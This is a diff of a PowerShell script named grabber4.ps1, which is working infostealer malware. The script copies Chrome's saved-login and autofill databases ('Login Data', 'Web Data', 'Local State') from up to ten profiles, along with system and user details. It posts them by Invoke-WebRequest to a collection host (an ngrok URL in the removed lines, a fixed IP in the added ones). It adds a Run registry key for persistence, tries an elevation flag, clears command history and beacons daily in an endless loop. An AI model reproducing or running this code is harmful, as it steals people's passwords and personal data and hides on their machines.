@@ -1,63 +1,70 @@
+$Header += Get-NetIPConfiguration 
+
+$Header += Get-ComputerInfo
+
+$Header += whoami
+
+$Header += Get-Date
+
 $var += Get-Content "Local State"
 
-cd Default
+cd Default 
+
+$var += Get-WinSystemLocale
+
+# if profiles exist try 1 - 10 if not pull data normally... (GOOGLE CHROME)
+
+if (Test-Path -Path "Profile 1") { 
+    $var += cat -Path "Profile 1\Web Data"
+
+    $var += cat -Path "Profile 2\Login Data"
+
+    $var += cat -Path "Profile 2\Web Data"
+
+    $var += cat -Path "Profile 3\Login Data"
+
+    $var += cat -Path "Profile 3\Web Data"
+
+    $var += cat -Path "Profile 4\Login Data"
+
+    $var += cat -Path "Profile 4 \Web Data"
+
+    $var += cat -Path "Profile 5\Login Data"
+
+    $var += cat -Path "Profile 5\Web Data"
+
+    $var += cat -Path "Profile 6\Login Data"
+
+    $var += cat -Path "Profile 6\Web Data"
+
+    $var += cat -Path "Profile 7\Login Data"
+
+    $var += cat -Path "Profile 7\Web Data"
+
+    $var += cat -Path "Profile 8\Login Data"
+
+    $var += cat -Path "Profile 8\Web Data"
+
+    $var += cat -Path "Profile 9\Login Data"
+
+    $var += cat -Path "Profile 9\Web Data"
+
+    $var += cat -Path "Profile 10\Login Data"
+
+    $var += cat -Path "Profile 10\Web Data"
+} else {
+    $var += Get-Content "Login Data"
+
+    $var += Get-Content "Web Data"
+}
 
 
-$var += Get-Content "Login Data"
 
-$var += Get-Content "Web Data"
-
-
-
-    # if more than 1 profile try this
-
-$var += cat -Path "Profile 1\Login Data"
-
-$var += cat -Path "Profile 1\Web Data"
-
-$var += cat -Path "Profile 2\Login Data"
-
-$var += cat -Path "Profile 2\Web Data"
-
-$var += cat -Path "Profile 3\Login Data"
-
-$var += cat -Path "Profile 3\Web Data"
-
-$var += cat -Path "Profile 4\Login Data"
-
-$var += cat -Path "Profile 4 \Web Data"
-
-$var += cat -Path "Profile 5\Login Data"
-
-$var += cat -Path "Profile 5\Web Data"
-
-$var += cat -Path "Profile 6\Login Data"
-
-$var += cat -Path "Profile 6\Web Data"
-
-$var += cat -Path "Profile 7\Login Data"
-
-$var += cat -Path "Profile 7\Web Data"
-
-$var += cat -Path "Profile 8\Login Data"
-
-$var += cat -Path "Profile 8\Web Data"
-
-$var += cat -Path "Profile 9\Login Data"
-
-$var += cat -Path "Profile 9\Web Data"
-
-$var += cat -Path "Profile 10\Login Data"
-
-$var += cat -Path "Profile 10\Web Data"
-
-
-
-$var += if (Test-Path -Path "Profile 1") {
+$var += if (Test-Path -Path "Profile 1") { 
     "Profile 1 exists"
 } else {
     "Profile 1 does not exist"
-}
+} 
 
 $var += if (Test-Path -Path "Profile 2") {
     "Profile 2 exists"
@@ -117,34 +124,46 @@ start-sleep 4
 
 
 
-$var += Get-NetIPConfiguration 
-
-$var += whoami
-
-$var += Get-ComputerInfo
-
-$var += Get-Date
-
-$var += ps 
-
-Start-Sleep -Seconds 3
-
 #start http post 
 
 #httpsend
 
-    $Response = Invoke-WebRequest -Method Post -URI https://293c-70-31-164-93.ngrok-free.app -body $var -UseBasicParsing
+    $Response = Invoke-WebRequest -Method Post -URI 192.168.2.190:80 -header $Header -body $var -UseBasicParsing
 
 #set per
 
-New-ItemProperty -Path "Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
+New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
     -Name "grabber4.ps1" `
     -Value "%LOCALAPPDATA%\Google\Chrome\User Data\grabber4.ps1 -autostart"
+
+# attempt to elevate permissions on next execution
+
+New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" `
+    -Name "%LocalAppData%\Google\Chrome\User Data\grabber4.ps1" `
+    -Value "%LocalAppData%\Google\Chrome\User Data\grabber4.ps1"
+
+
 
 cd..
 
 Clear-History
 
+# after 24 hours start while true statement...
+
 start-sleep 86400
 
-./grabber4.ps1
+#core system commands to keep
+
+while($true)
+{ 
+    $varper += Get-ComputerInfo
+    $varper += whoami
+    $varper += Get-Date
+    $varper += ipconfig
+
+    #http send
+
+    $Response = Invoke-WebRequest -Method Post -URI 192.168.2.190:80 -body $varper -UseBasicParsing
+
+    Start-Sleep -Seconds 86400
+}
